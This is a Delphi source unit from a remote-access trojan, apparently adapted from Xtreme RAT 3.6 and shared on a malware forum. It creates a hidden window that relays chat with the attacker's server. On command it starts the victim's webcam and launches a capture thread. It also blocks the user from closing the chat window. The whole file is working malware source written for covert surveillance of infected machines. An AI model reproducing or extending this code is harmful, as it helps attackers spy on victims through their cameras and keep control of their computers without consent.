unit UnitChat; //In Xtreme RAT 3.6 soure code, an hidden window is used to execute message of
//related webcam. In this case we will use the chat window handle to execute both chat and webcam
//related messages, by wrh1d3

//This unit source code was already uploaded on OpenSc.ws

interface

uses
  Windows, SysUtils, Messages, uCamHelper, UnitCapture, UnitCommands, UnitUtils;

procedure CreateChatWindow;

var
  MainHandle: THandle;
  Nickname: string; //nick for chat session
  WM_WEBCAM_START,  WM_CHAT_TEXT: Cardinal;

implementation

uses
  UnitConnection;

var
  hButton, hEdit, hMemo, bFont, eFont: THandle; //for main window components (Memo, button, ...)

function GetMemoText: string;
var
  Len: Integer;
  TmpChar: PChar;
begin       
  Result := '';
  Len := SendMessage(hMemo, WM_GETTEXTLENGTH, 0, 0);
  if Len = 0 then Exit;
  Len := Len + 1;
  GetMem(TmpChar, Len);
  FillChar(TmpChar^, Len, 0);
  Len := SendMessage(hMemo, WM_GETTEXT, Len, Integer(TmpChar));
  SetString(Result, TmpChar, Len);
  FreeMem(TmpChar);
end;

function GetEditText: string;
var
  Len: Integer;
  TmpChar: PChar;
begin
  Result := '';
  Len := SendMessage(hEdit, WM_GETTEXTLENGTH, 0, 0);
  if Len = 0 then Exit;
  Len := Len + 1;
  GetMem(TmpChar, Len);
  FillChar(TmpChar^, Len, 0);
  Len := SendMessage(hEdit, WM_GETTEXT, Len, Integer(TmpChar));
  SetString(Result, TmpChar, Len);
  FreeMem(TmpChar);
end;

function WindowProc(hWnd: HWND; Msg: UINT; wParam: WPARAM; lParam: LPARAM): LRESULT; stdcall;
var
  TmpList: TStringArray;
  TmpStr, ToSend: string;
  i: Integer;
begin
  if Msg = WM_CREATE then
  begin
    eFont := CreateFont(-12,0,0,0,0,0,0,0, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
      DEFAULT_QUALITY, VARIABLE_PITCH or FF_SWISS, 'Tahoma');

    bFont := CreateFont(-12,0,0,0,0,0,0,0, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
      DEFAULT_QUALITY, VARIABLE_PITCH or FF_SWISS, 'Tahoma');

    hMemo := CreateWindow('EDIT', '', WS_CHILD or WS_VISIBLE or WS_VSCROLL or
      ES_MULTILINE or ES_WANTRETURN, CW_USEDEFAULT, CW_USEDEFAULT, 590,
      300, hWnd, 0, GetModuleHandle(nil), nil);
    SendMessage(hMemo, EM_SETREADONLY, Integer(True), 0);
    SendMessage(hMemo, WM_SETFONT, eFont, 0);

    hEdit := CreateWindow('EDIT', '', WS_CHILD or WS_VISIBLE, 10, 310,
      480, 21, hWnd, 0, GetModuleHandle(nil), nil);
    SendMessage(hEdit, WM_SETFONT, eFont, 0);

    hButton := CreateWindow('BUTTON', 'Send', WS_CHILD or WS_VISIBLE or
      BS_PUSHBUTTON or BS_TEXT, 510, 308, 75, 25, hWnd, 0, GetModuleHandle(nil), nil);
    SendMessage(hButton, WM_SETFONT, bFont, 0);
  end
  else

  if Msg = WM_COMMAND then
  begin
    if lParam = hButton then
    begin
      ToSend := GetEditText;
      if ToSend = '' then Exit;
      TmpStr := '[' + TimeToStr(Time) + '] You: ' + ToSend;
      TmpStr := GetMemoText + TmpStr + #13#10;
      SendMessage(hMemo, WM_SETTEXT, 0, Integer(PChar(TmpStr)));
      i := Length(GetMemoText);
      SendMessage(hMemo, EM_SETSEL, i, i);
      SendMessage(hMemo, EM_SCROLLCARET, 0, 0);
      SendMessage(hEdit, WM_SETTEXT, 0, 0);

      SendDatas(IntToStr(CMD_CHAT) + '|' + IntToStr(CMD_CHAT_TEXT) + '|' + ToSend);
    end;
  end
  else

  if Msg = WM_CLOSE then Exit else //user cannot close window on mouse click
  
  if Msg = WM_DESTROY then //free all
  begin
    DestroyWindow(hButton);
    DestroyWindow(hMemo);
    DestroyWindow(hEdit);
    DeleteObject(eFont);
    DeleteObject(bFont);
    DestroyWindow(MainHandle);
    PostQuitMessage(0);
  end
  else

  if Msg = WM_CHAT_TEXT then //write chat text in memo
  begin
    i := Integer(wParam);
    SetLength(TmpStr, i);
    CopyMemory(@TmpStr[1], Pointer(lParam), i);
    TmpStr := '[' + TimeToStr(Time) + '] ' + NickName + ': ' + TmpStr;
    TmpStr := GetMemoText + TmpStr + #13#10;
    SendMessage(hMemo, WM_SETTEXT, 0, Integer(PChar(TmpStr)));
    i := Length(GetMemoText);
    SendMessage(hMemo, EM_SETSEL, i, i);
    SendMessage(hMemo, EM_SCROLLCARET, 0, 0);
  end
  else

  if Msg = WM_WEBCAM_START then
  begin
    i := Integer(wParam);
    SetLength(TmpStr, i);
    CopyMemory(@TmpStr[1], Pointer(lParam), i); //get command parameters

    TmpList := ParseString('|', TmpStr);
    CamHelper.StartCam(StrToInt(TmpList[0]) + 1); //with API (capGetDriverDescription) webcam drivers
    //are set in order 0, 1, 2, 3, ... but with directx webcam they are set in order 1, 2, 3, ...
    //we've got webcam drivers with API method so we need to increment driver position given
    //by server

    CaptureInfos.TmpList := TmpList;
    WebCamBool := True;
    MyStartThread(@WebCamThread, @CaptureInfos);
  end
  else

  Result := DefWindowProc(HWND, Msg, wParam, lParam);
end;

procedure CreateChatWindow;
var
  wClass: TWndClass;
begin
  wClass.style := 0;
  wClass.lpfnWndProc := @WindowProc;
  wClass.cbClsExtra := 0;
  wClass.cbWndExtra := 0;
  wClass.hInstance := HInstance;
  wClass.hIcon := 0;
  wClass.hCursor := 0;
  wClass.hbrBackground := COLOR_BTNFACE + 1;
  wClass.lpszMenuName := nil;
  wClass.lpszClassName := 'OpenSc_Chat';

  RegisterClass(wClass);
  MainHandle := CreateWindowEx(WS_EX_DLGMODALFRAME or WS_EX_WINDOWEDGE,
    wClass.lpszClassName, '', WS_VISIBLE, 250, 50, 610, 380, 0, 0, HInstance, nil);

  ShowWindow(MainHandle, 0); //hide window first
  UpdateWindow(MainHandle);
end;

initialization
  WM_CHAT_TEXT := RegisterWindowMessage('wm_chat_text');
  WM_WEBCAM_START := RegisterWindowMessage('wm_webcam_start');

end.
